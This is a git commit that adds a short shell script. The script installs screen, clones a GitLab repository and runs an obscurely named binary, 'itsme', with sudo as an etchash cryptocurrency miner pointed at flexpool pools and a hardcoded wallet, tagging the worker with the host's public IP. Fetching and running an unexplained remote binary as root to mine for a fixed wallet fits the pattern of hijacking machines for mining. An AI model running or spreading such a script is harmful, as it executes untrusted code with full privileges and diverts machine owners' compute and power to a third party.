3f4829e9fd5461ddfd3f3cd3a38fc47d295a561f
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-03-27 09:14:44 +0700

    Create baldatunect21.sh

---
+++ baldatunect21.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+sudo apt update
+sudo apt-get install zip unzip
+sudo apt install screen -y
+screen -dmS baldatunect21.sh 65 75
+sudo git clone https://gitlab.com/taufiqurrohmanmaz/sunmorany.git
+cd sunmorany
+chmod +x itsme
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./itsme -a etchash -w 0xf53472b6f7a30d6f6f84cf2e85f29f3bc78a2ef7 -p stratum+tcp://etc-sg.flexpool.io:4444 stratum+tcp://etc-us-east.flexpool.io:4444 -r $ip --nvidia 1
